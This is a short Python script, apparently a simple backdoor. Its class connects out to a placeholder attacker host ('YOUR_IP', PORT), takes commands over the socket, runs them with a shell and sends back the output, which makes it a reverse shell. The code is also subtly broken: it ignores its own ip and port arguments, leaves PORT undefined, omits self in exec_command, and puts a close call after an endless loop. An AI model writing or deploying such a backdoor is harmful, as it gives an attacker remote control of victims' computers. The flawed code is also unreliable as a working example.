import socket
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.con.connect(("YOUR_IP", PORT))
        

    def exec_command(command):
        return subprocess.check_output(command, shell=True)


    def run(self):
        while True:
            command = self.con.recv(1024).decode()
            command_result = self.exec_command(command)
            self.con.send(command_result)

        self.con.close()
